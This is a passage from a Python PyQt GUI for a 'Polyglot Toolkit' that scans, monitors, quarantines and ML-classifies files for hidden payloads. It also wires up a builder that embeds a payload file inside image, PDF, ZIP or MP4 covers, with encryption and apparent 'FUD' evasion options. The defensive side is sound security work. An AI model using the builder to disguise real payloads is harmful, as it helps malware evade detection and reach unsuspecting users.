        cl.addLayout(r); l.addWidget(cc)

        sr = QHBoxLayout(); sr.setSpacing(15)
        self.m_scanned = stat_card("🔍","0","Scanned",T.BLUE)
        self.m_threats = stat_card("⚠","0","Threats",T.RED)
        self.m_clean = stat_card("✓","0","Clean",T.GREEN)
        for c in [self.m_scanned,self.m_threats,self.m_clean]: sr.addWidget(c)
        l.addLayout(sr)

        fc, fl = card("Live Alert Feed","🔔"); self.m_feed = log_box(); fl.addWidget(self.m_feed); l.addWidget(fc,1)
        return p

    # ── ML Training ──────────────────────────────────────────

    def _pg_training(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(15)
        l.addWidget(self._header("🧠 ML Training (CatBoost GPU)", T.PURPLE))

        oc, ol = card("Training Options","⚙")
        g = QGridLayout(); g.setSpacing(12)
        g.addWidget(QLabel("Samples per class:"),0,0); self.t_samples = QSpinBox(); self.t_samples.setRange(100,10000); self.t_samples.setValue(500); self.t_samples.setStyleSheet(f"background:{T.BG_IN};color:{T.FG};border:1px solid {T.BORDER};border-radius:4px;padding:6px"); g.addWidget(self.t_samples,0,1)
        g.addWidget(QLabel("Task Type:"),0,2); self.t_task = combo(["GPU","CPU"]); g.addWidget(self.t_task,0,3)
        self.t_gen_only = QCheckBox("Generate samples only (no train)"); g.addWidget(self.t_gen_only,1,0,1,2)
        ol.addLayout(g); l.addWidget(oc)

        bb = btn("🧠 GENERATE + TRAIN", T.PURPLE); bb.setFixedHeight(48); bb.clicked.connect(self._run_training)
        br = QHBoxLayout(); br.addWidget(bb)
        lb = btn("📂 Load Existing Model", T.DIM); lb.clicked.connect(self._load_model); br.addWidget(lb)
        br.addStretch(); l.addLayout(br)

        lc, ll = card("Training Log","📋"); self.t_log = log_box(); ll.addWidget(self.t_log); l.addWidget(lc,1)
        return p

    # ── Quarantine ───────────────────────────────────────────

    def _pg_quarantine(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(15)
        l.addWidget(self._header("🛡 Quarantine Vault", T.GREEN))

        # q_manager already initialized in __init__

        br = QHBoxLayout()
        rb=btn("🔄 Refresh",T.DIM); rb.clicked.connect(self._refresh_quarantine); br.addWidget(rb)
        db=btn("🗑 Purge Expired",T.ORANGE); db.clicked.connect(self._purge_quarantine); br.addWidget(db)
        br.addStretch(); l.addLayout(br)

        self.q_tree = QTreeWidget()
        self.q_tree.setHeaderLabels(["ID","Original Name","Risk","Confidence","Date","Status"])
        self.q_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        l.addWidget(self.q_tree,1)

        ab = QHBoxLayout()
        rst=btn("↩ Restore Selected",T.GREEN); rst.clicked.connect(self._restore_quarantine); ab.addWidget(rst)
        dlt=btn("🗑 Delete Selected",T.RED); dlt.clicked.connect(self._delete_quarantine); ab.addWidget(dlt)
        ab.addStretch(); l.addLayout(ab)
        return p

    # ── YARA Rules ───────────────────────────────────────────

    def _pg_yara(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(15)
        l.addWidget(self._header("📋 YARA Rules (49 Built-in)", T.YELLOW))

        self.y_tree = QTreeWidget()
        self.y_tree.setHeaderLabels(["Rule","Severity","Description","Patterns"])
        self.y_tree.header().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        l.addWidget(self.y_tree,1)

        yara = YaraEngine()
        sev_colors = {'critical':T.RED,'high':T.ORANGE,'medium':T.YELLOW,'low':T.DIM}
        for rule in yara.rules:
            item = QTreeWidgetItem([rule.name, rule.severity.upper(), rule.description,
                                    str(len(rule.patterns))+" patterns"])
            item.setForeground(0, QColor(sev_colors.get(rule.severity, T.FG)))
            item.setForeground(1, QColor(sev_colors.get(rule.severity, T.FG)))
            self.y_tree.addTopLevelItem(item)
        return p

    # ── Logs ─────────────────────────────────────────────────

    def _pg_logs(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(15)
        l.addWidget(self._header("📜 Activity Log", T.FG))
        br = QHBoxLayout()
        for text,cb in [("Clear",lambda:self.log_box_main.clear()),("Export",self._export_log)]:
            b=btn(text,T.DIM); b.clicked.connect(cb); br.addWidget(b)
        br.addStretch(); l.addLayout(br)
        self.log_box_main = log_box(); l.addWidget(self.log_box_main,1)
        self._log("Polyglot Toolkit v3.0 initialized","header")
        self._log(f"ML Model: {'Loaded' if self.model.is_loaded else 'Not loaded'}","info")
        self._log(f"Platform: {platform.system()} {platform.release()}","info")
        return p

    # ── Settings ─────────────────────────────────────────────

    def _pg_settings(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(15)
        l.addWidget(self._header("⚙ Settings", T.FG))

        tc, tl = card("Detection Thresholds","🎯")
        g = QGridLayout(); g.setSpacing(12)
        self._threshold_spinboxes = {}
        for i,(name,key,default) in enumerate([("Detect","detect",0.65),("Quarantine","quarantine",0.80),("Alert","alert",0.50)]):
            g.addWidget(QLabel(f"{name}:"),i,0)
            sp = QSpinBox(); sp.setRange(0,100); sp.setValue(int(self.config.thresholds.get(key,default)*100))
            sp.setStyleSheet(f"background:{T.BG_IN};color:{T.FG};border:1px solid {T.BORDER};border-radius:4px;padding:6px"); sp.setSuffix("%")
            g.addWidget(sp,i,1)
            self._threshold_spinboxes[key] = sp
        tl.addLayout(g)
        save_btn = QPushButton("💾 Save Thresholds"); save_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        save_btn.setStyleSheet(f"background:{T.BLUE};color:white;border:none;border-radius:6px;padding:8px 16px;font-weight:bold;margin-top:8px")
        save_btn.clicked.connect(self._save_thresholds)
        tl.addWidget(save_btn)
        l.addWidget(tc)

        nc, nl = card("Notifications","🔔")
        self.n_enabled = QCheckBox("Enable desktop notifications"); self.n_enabled.setChecked(True)
        self.n_sound = QCheckBox("Enable alert sounds"); self.n_sound.setChecked(True)
        self.n_critical = QCheckBox("Critical alerts only")
        nl.addWidget(self.n_enabled); nl.addWidget(self.n_sound); nl.addWidget(self.n_critical)
        l.addWidget(nc)

        mc, ml_ = card("Model","🧠")
        ml_.addWidget(QLabel(f"Status: {'Loaded' if self.model.is_loaded else 'Not loaded'}"))
        ml_.addWidget(QLabel(f"Path: models/polyglot_shield.cbm"))
        ml_.addWidget(QLabel(f"Task: {self.config.model.get('task_type','GPU')}"))
        l.addWidget(mc)

        l.addStretch()
        return p

    # ── Helpers ──────────────────────────────────────────────

    def _header(self, text, color=T.FG):
        h = QLabel(text); h.setStyleSheet(f"font-size:24px;font-weight:bold;color:{color};"); return h

    def _save_thresholds(self):
        for key, sp in self._threshold_spinboxes.items():
            self.config.thresholds[key] = sp.value() / 100.0
        try:
            import yaml
            cfg_path = os.path.expanduser("~/.polyglot/config.yaml")
            with open(cfg_path, 'r') as f:
                cfg = yaml.safe_load(f) or {}
            cfg['thresholds'] = self.config.thresholds
            with open(cfg_path, 'w') as f:
                yaml.dump(cfg, f, default_flow_style=False)
            self._log(f"Thresholds saved: {self.config.thresholds}", "success")
        except Exception as e:
            self._log(f"Save failed: {e}", "critical")

    def _notify(self, title, msg, severity="info"):
        """Send notification if enabled in settings."""
        if hasattr(self, 'n_enabled') and self.n_enabled.isChecked():
            if severity == "critical" or not hasattr(self, 'n_critical') or not self.n_critical.isChecked():
                Notifier.send(title, msg, severity)

    def _browse(self, entry):
        p,_ = QFileDialog.getOpenFileName(self,"Select File")
        if p: entry.setText(p)

    def _browse_dir(self, entry):
        p = QFileDialog.getExistingDirectory(self,"Select Directory")
        if p: entry.setText(p)

    def _log(self, text, tag=None):
        colors = {'critical':T.RED,'high':T.ORANGE,'warning':T.YELLOW,'info':T.BLUE,
                  'success':T.GREEN,'header':T.RED,'clean':T.CYAN}
        ts = datetime.now().strftime('%H:%M:%S')
        append_log(self.log_box_main, f"[{ts}] {text}", colors.get(tag, T.FG))

    # ── Builder Action ───────────────────────────────────────

    def _run_builder(self):
        cover = self.b_cover.text().strip(); payload = self.b_payload.text().strip()
        if not cover or not os.path.isfile(cover): QMessageBox.warning(self,"Error","Select a valid cover file"); return
        if not payload or not os.path.isfile(payload): QMessageBox.warning(self,"Error","Select a valid payload file"); return
        ext_map={'JPEG':'.jpg','PNG':'.png','GIF':'.gif','PDF':'.pdf','ZIP':'.zip','MP4':'.mp4'}
        ct = self.b_type.currentText()
        output,_ = QFileDialog.getSaveFileName(self,"Save Polyglot As",f"polyglot{ext_map.get(ct,'.bin')}",f"{ct} Files (*{ext_map.get(ct,'.*')});;All Files (*)")
        if not output: return
        try:
            stats = self.builder.build(cover,payload,output,ct.lower(),self.b_enc.isChecked(),self.b_fud.isChecked(),self.b_mime.isChecked())
            for k,v in stats.items(): append_log(self.b_log, f"  {k}: {v}", T.GREEN)
            self.counts['built'] += 1; self.d_built._val.setText(str(self.counts['built']))
            self._log(f"Polyglot built: {output}","success")
            Notifier.send("Polyglot Built",f"{ct} polyglot created")
        except Exception as e:
            append_log(self.b_log, f"ERROR: {e}", T.RED); self._log(f"Build failed: {e}","critical")

    # ── Scanner Action ───────────────────────────────────────

    def _run_scanner(self):
        target = self.s_path.text().strip()
        if not target: QMessageBox.warning(self,"Error","Select a target"); return
        if os.path.isfile(target): files = [target]
        elif os.path.isdir(target):
            exts={'.jpg','.jpeg','.png','.gif','.bmp','.pdf','.doc','.docx','.zip','.exe','.dll','.bat','.cmd','.ps1','.vbs','.js','.mp4'}
            files=[]
            for root,dirs,fnames in os.walk(target):
                dirs[:]=[d for d in dirs if not d.startswith('.')]
                for f in fnames:
                    if os.path.splitext(f)[1].lower() in exts: files.append(os.path.join(root,f))
        else: return
        self.s_tree.clear(); self.s_progress.setMaximum(len(files)); self.s_progress.setValue(0)
        self._log(f"Scanning {len(files)} files...","info")
        self.scan_worker = ScanWorker(files, self.s_use_ml.isChecked() and self.model.is_loaded, self.model)
        self.scan_worker.result.connect(self._on_scan_result)
        self.scan_worker.progress.connect(lambda c,t: self.s_progress.setValue(c))
        self.scan_worker.done.connect(self._on_scan_done)
        self.scan_worker.start()

    def _on_scan_result(self, r):
        sev_colors = {'critical':T.RED,'high':T.ORANGE,'warning':T.YELLOW,'clean':T.GREEN,'error':T.RED}
        if 'ml_label' in r:
            item = QTreeWidgetItem([r['file'], r['severity'].upper(), r['ml_label'],
                                    f"{r['ml_risk']:.1f}%", f"{r.get('ml_conf',0)*100:.1f}%",
                                    str(r['yara_count']),
                                    str(r['findings']), ', '.join(r.get('yara_rules',[])[:3])])
        else:
            details = '; '.join(f['detail'] for f in r.get('details',[])[:3])
            item = QTreeWidgetItem([r['file'], r['severity'].upper(), '—', '—', '—', '—',
                                    str(r.get('findings',0)), details])
        color = sev_colors.get(r['severity'], T.FG)
        for i in range(8): item.setForeground(i, QColor(color))
        self.s_tree.addTopLevelItem(item)
        self.counts['scanned'] += 1; self.d_scanned._val.setText(str(self.counts['scanned']))

    def _on_scan_done(self, stats):
        self._log(f"Scan complete: {stats['total']} files, {stats['threats']} threats",
                  "critical" if stats['threats']>0 else "success")
        self.counts['threats'] += stats['threats']; self.d_threats._val.setText(str(self.counts['threats']))
        if stats['threats']>0:
            Notifier.send("THREATS DETECTED",f"{stats['threats']} threats in {stats['total']} files","critical")
            append_log(self.d_alerts, f"[{datetime.now().strftime('%H:%M:%S')}] ⚠ {stats['threats']} threats in {stats['total']} files", T.RED)
            # Auto-quarantine: offer to quarantine files flagged as threats
            if stats.get('threat_files'):
                reply = QMessageBox.question(self, "Quarantine Threats",
                    f"{stats['threats']} threats detected. Quarantine {len(stats['threat_files'])} files?",
                    QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
                if reply == QMessageBox.StandardButton.Yes:
                    quarantined = 0
                    for fpath, findings in stats['threat_files']:
                        scan_result = self._findings_to_scan_result(fpath, findings)
                        qid = self.q_manager.quarantine(fpath, scan_result, force=True)
                        if qid: quarantined += 1
                    self._log(f"Quarantined {quarantined} files", "critical")
                    self._refresh_quarantine()

    # ── Monitor Action ───────────────────────────────────────

    def _toggle_monitor(self):
        if self.mon_worker and self.mon_worker.running:
            self.mon_worker.stop_watch(); self.m_btn.setText("▶ START")
            self.m_btn.setStyleSheet(f"background:{T.GREEN};color:white;border:none;border-radius:6px;padding:10px 24px;font-weight:bold")
            self._log("Monitor stopped","warning")
        else:
            d = self.m_dir.text().strip()
            if not os.path.isdir(d): QMessageBox.warning(self,"Error","Select a valid directory"); return
            self.m_btn.setText("■ STOP")
            self.m_btn.setStyleSheet(f"background:{T.RED};color:white;border:none;border-radius:6px;padding:10px 24px;font-weight:bold")
            self._log(f"Monitoring: {d}","success")
            self.mon_worker = MonitorWorker()
            self.mon_worker.alert.connect(self._on_monitor_alert)
            self.mon_worker.stats.connect(self._on_monitor_stats)
            self.mon_worker.start_watch(d)

    def _findings_to_scan_result(self, filepath, findings):
        """Convert detector findings to QuarantineManager scan_result format."""
        sev_map = {'critical': 95, 'high': 80, 'warning': 50, 'info': 20, 'error': 0}
        max_sev = max((sev_map.get(f.get('severity', 'info'), 0) for f in findings), default=0)
        max_sev_name = 'CRITICAL' if max_sev >= 90 else 'HIGH' if max_sev >= 70 else 'MEDIUM' if max_sev >= 40 else 'LOW'
        sorted_findings = sorted(findings, key=lambda f: sev_map.get(f.get('severity', 'info'), 0), reverse=True)
        primary_label = sorted_findings[0].get('type', 'UNKNOWN') if sorted_findings else 'UNKNOWN'
        types = list({f.get('type', 'UNKNOWN') for f in findings})
        return {
            'label': primary_label,
            'confidence': max_sev / 100.0,
            'risk_score': float(max_sev),
            'risk_level': max_sev_name,
            'yara_matches': [],
            'detected_types': types,
        }

    def _on_monitor_alert(self, a):
        append_log(self.m_feed, f"[{a['time']}] [{a['severity'].upper()}] {a['file']}", T.RED)
        append_log(self.m_feed, f"  → {a['detail']}", T.DIM)
        append_log(self.d_alerts, f"[{a['time']}] ⚠ {a['file']}: {a['detail']}", T.RED)
        self.counts['threats'] += 1; self.d_threats._val.setText(str(self.counts['threats']))
        # Auto-quarantine monitored threats
        if a.get('path') and a.get('findings') and hasattr(self, 'q_manager'):
            scan_result = self._findings_to_scan_result(a['path'], a['findings'])
            qid = self.q_manager.quarantine(a['path'], scan_result, force=True)
            if qid:
                append_log(self.d_alerts, f"  🔒 Quarantined {a['file']} (ID: {qid})", T.ORANGE)
                self._log(f"Auto-quarantined: {a['file']}", "critical")

    def _on_monitor_stats(self, s):
        self.m_scanned._val.setText(str(s['scanned'])); self.m_threats._val.setText(str(s['threats'])); self.m_clean._val.setText(str(s['clean']))
        # Dashboard shows total (scanner + monitor)
        total_scanned = self.counts['scanned'] + s['scanned']
        self.d_scanned._val.setText(str(total_scanned))

    # ── Training Action ──────────────────────────────────────

    def _run_training(self):
        self.t_log.clear()
        self.train_worker = TrainWorker(self.t_samples.value(), self.t_task.currentText())
        self.train_worker.log.connect(lambda t: append_log(self.t_log, t, T.CYAN if "ERROR" not in t else T.RED))
        self.train_worker.done.connect(self._on_train_done)
        self.train_worker.start()

    def _on_train_done(self, meta):
        if 'error' in meta:
            self._log(f"Training failed: {meta['error']}","critical")
        else:
            self._log("Model trained and saved!","success")
            try: self.model.load("models/polyglot_shield.cbm")
            except: pass
            self.s_use_ml.setChecked(self.model.is_loaded)

    def _load_model(self):
        p,_ = QFileDialog.getOpenFileName(self,"Load Model","","CatBoost Model (*.cbm);;All Files (*)")
        if p:
            try: self.model.load(p); self._log(f"Model loaded: {p}","success")
            except Exception as e: self._log(f"Load failed: {e}","critical")

    # ── Quarantine Actions ───────────────────────────────────

    def _refresh_quarantine(self):
        self.q_tree.clear()
        entries = self.q_manager.list_quarantined()
        sev_colors = {'CRITICAL':T.RED,'HIGH':T.ORANGE,'MEDIUM':T.YELLOW,'LOW':T.DIM,'SAFE':T.GREEN}
        for m in entries:
            status = "Restored" if m.get('restored') else "Quarantined"
            item = QTreeWidgetItem([m.get('quarantine_id','?')[:8], m.get('original_name','?'),
                                    m.get('risk_level','?'), f"{m.get('confidence',0):.2f}",
                                    m.get('timestamp','?')[:19], status])
            color = sev_colors.get(m.get('risk_level',''), T.FG)
            for i in range(6): item.setForeground(i, QColor(color))
            self.q_tree.addTopLevelItem(item)

    def _purge_quarantine(self):
        purged = self.q_manager.auto_purge_expired()
        self._log(f"Purged {purged} expired entries","info")
        self._refresh_quarantine()

    def _restore_quarantine(self):
        item = self.q_tree.currentItem()
        if not item: return
        qid = item.text(0)
        dest,_ = QFileDialog.getSaveFileName(self,"Restore To")
        if dest:
            r = self.q_manager.restore(qid, dest)
            if r: self._log(f"Restored: {r}","success")
            else: self._log("Restore failed","critical")
            self._refresh_quarantine()

    def _delete_quarantine(self):
        item = self.q_tree.currentItem()
        if not item: return
        qid = item.text(0)
        reply = QMessageBox.question(self, "Confirm Delete",
            f"Permanently delete quarantined file {qid}?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        if reply == QMessageBox.StandardButton.Yes:
            if self.q_manager.delete(qid):
                self._log(f"Deleted: {qid}","warning")
            else:
                self._log("Delete failed — not found","critical")
        self._refresh_quarantine()

    # ── YARA / Logs / Settings ───────────────────────────────

    def _quick_scan(self):
        p,_ = QFileDialog.getOpenFileName(self,"Quick Scan")
        if p: self.s_path.setText(p); self._switch(2,self.nav[2]); self._run_scanner()

    def _quick_sanitize(self):
        p,_ = QFileDialog.getOpenFileName(self,"Quick Sanitize")
        if p:
            r = self.sanitizer.sanitize(p)
            self._log(f"Sanitize: {r['detail']}",'success' if r['status']=='sanitized' else 'info')
            self.counts['sanitized'] += 1; self.d_sanitized._val.setText(str(self.counts['sanitized']))

    def _export_log(self):
        p,_ = QFileDialog.getSaveFileName(self,"Export Log","polyglot_log.txt","Text (*.txt)")
        if p:
            with open(p,'w') as f: f.write(self.log_box_main.toPlainText())
            Notifier.send("Log Exported",f"Saved to {os.path.basename(p)}")


# ── Entry Point ──────────────────────────────────────────────

def main():
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    palette = QPalette()
    palette.setColor(QPalette.ColorRole.Window, QColor(T.BG))
    palette.setColor(QPalette.ColorRole.WindowText, QColor(T.FG))
    palette.setColor(QPalette.ColorRole.Base, QColor(T.BG_IN))
    palette.setColor(QPalette.ColorRole.AlternateBase, QColor(T.BG2))
    palette.setColor(QPalette.ColorRole.Text, QColor(T.FG))
    palette.setColor(QPalette.ColorRole.Button, QColor(T.BG3))
    palette.setColor(QPalette.ColorRole.ButtonText, QColor(T.FG))
    palette.setColor(QPalette.ColorRole.Highlight, QColor(T.RED))
    palette.setColor(QPalette.ColorRole.HighlightedText, QColor("#ffffff"))
    app.setPalette(palette)
    window = PolyglotApp()
    window.show()
    sys.exit(app.exec())

if __name__ == '__main__':
    main()
